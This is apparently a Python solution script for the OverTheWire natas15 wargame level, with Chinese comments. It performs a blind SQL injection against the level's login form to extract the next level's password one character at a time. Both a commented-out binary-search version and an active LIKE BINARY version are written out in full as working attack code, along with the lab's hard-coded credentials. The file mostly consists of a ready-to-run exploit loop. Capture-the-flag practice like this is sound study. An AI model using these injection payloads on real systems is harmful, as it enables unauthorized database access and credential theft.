# import requests
# url = 'http://natas15.natas.labs.overthewire.org/index.php'
# username= 'natas15'
# password= 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
# key = ""
# 
# proxy='127.0.0.1:10808'
# proxies={
# 
#   'sock5':'sock5://'+proxy,
#  }
# 
# for pos in range(34):
#     low = 32
#     high = 126
#     mid = (high+low)>>1# >>代表除以2，取较小的一个值
#     
#     while mid<high:
#         #print low,mid,high
#         payload= "natas16\" and %d < ascii(mid(password,%d,1)) and \"\" like \"" %  (mid, pos)
#         print(payload)
#         req = requests.post(url, auth = requests.auth.HTTPBasicAuth(username,password),data={"username":payload},proxies=proxies)
#         #print req.text,
#         if req.text.find("doesn't exist")==-1:
#             low = mid+1
#         else:
#             high=mid 
#         mid = (high+low)>>1
#  
#     key+=chr(mid)
#     print(key)

# -*- coding: UTF-8 -*-
import requests

proxy='127.0.0.1:10808'
proxies={

  'sock5':'sock5://'+proxy,
 }

username= 'natas15'
password= 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
key = ""

url='http://natas15.natas.labs.overthewire.org/index.php'
 
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
 
filtered = ''
 
passwd = ''
 
for char in chars:
    Data = {'username' : 'natas16" and password LIKE BINARY "%' + char + '%" #'}
    #使用like模糊查询不会区分大小写，要带上binary
    r = requests.post(url=url,auth = requests.auth.HTTPBasicAuth(username,password),data=Data,proxies=proxies)
    if 'exists' in r.text :
        filtered = filtered + char
        print(filtered) #先过滤出密码里存在的字符，然后再跑具体的值，这样能加快速度
 
for i in range(0,32):
    for char in filtered:
        Data = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
        #使用like模糊查询不会区分大小写，要带上binary
        r = requests.post(url=url,auth = requests.auth.HTTPBasicAuth(username,password),data=Data,proxies=proxies)
        if 'exists' in r.text :
            passwd = passwd + char
            print(passwd)
            break